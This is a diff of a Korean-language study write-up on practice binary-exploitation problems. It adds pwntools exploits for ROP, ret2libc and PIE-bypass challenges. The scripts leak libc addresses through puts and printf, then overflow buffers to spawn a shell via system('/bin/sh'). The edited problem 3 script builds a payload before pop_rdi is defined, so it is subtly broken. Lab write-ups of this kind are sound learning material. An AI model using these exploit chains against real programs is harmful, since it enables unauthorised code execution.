@@ -24,7 +24,7 @@ p.interactive()
 
 ## problem 3
 
-ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다.
+ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다. 가젯의 주소를 찾기 위해서 pie를 우회해야 하는데, 
 
 ```python
 
@@ -42,13 +42,20 @@ libc_base = printf_addr - libc.symbols['printf']
 system_addr = libc_base + libc.symbols['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
+payload = b'A'*0x20
+payload += b'B'*0x8
+payload += p64(pop_rdi)
+payload += p64(binsh)
+#payload += p64(pop_rdi+1)
+payload += p64(system_addr)
+
 pie_base = printf_addr - 0x1040
 
 pop_rdi = pie_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
 
 log.info("libc base : %s"%hex(libc_base))
 log.info("system addr : %s"%hex(system_addr))
-log.info("pop rid: %s"%hex(pop_rdi))
+log.info("pop rdi: %s"%hex(pop_rdi))
 
 
 payload = b'A'*0x20
@@ -64,14 +71,59 @@ p.interactive()
 
 ```
 
-익스플로잇이 되지 않는다. rop gadget은 PIE로 랜덤화되기 때문에 libc base를 같이 사용하면 안 되기 때문인가? 잘 모르겠다...ㅜㅜ 풀지 못했다.
-
 
 
 
 ## problem 3-2
 
-마찬가지로 ROP 문제이다. read를 활용하여 
+마찬가지로 ROP 문제이다. puts를 이용하여 puts 함수의 실제 주소를 구하고, 이를 바탕으로 system과 '/bin/sh'의 주소를 구한다. payload에 main함수의 주소를 추가하여 다시 반복하게 한 뒤에 pop_rdi, binsh, system_addr를 보내면 쉘을 얻을 수 있다.
+
+```python
+
+from pwn import *
+
+p = process("./rop2")
+e = ELF("./rop2")
+libc = e.libc
+
+puts_plt = 0x401060
+puts_got = 0x404018
+pop_rdi = 0x401283
+main = 0x4011cf
+
+p.recvuntil(b'buf:')
+
+payload = b'A'*1024
+payload += b'B'*0x8
+
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+p.sendline(payload)
+
+puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+
+libc_base = puts_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
+
+log.info("libc base : %s"%hex(libc_base))
+
+
+payload = b'A'*1024
+payload += b'B'*0x8
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system_addr)
+
+p.sendline(payload)
+
+p.interactive()
+
+
+```
 
 
 
@@ -87,14 +139,13 @@ from pwn import *
 p = process('./simple_pie_32')
 e = ELF('./simple_pie_32')
 libc = e.libc
-rop = ROP(e)
 
-p.recvuntil(b'at : 0x')
+p.recvuntil(b'at: 0x')
 main_addr = int(p.recvline(), 16)
 pie_base = main_addr - 0x122d
 win_addr = pie_base + 0x1291
 
-payload += b'A'*0x1c
+payload = b'A'*0x1c
 payload += b'A'*0x4
 payload += p32(win_addr)
 
@@ -108,6 +159,8 @@ p.interactive()
 
 
 ## problem 5
+
+
 
 
 
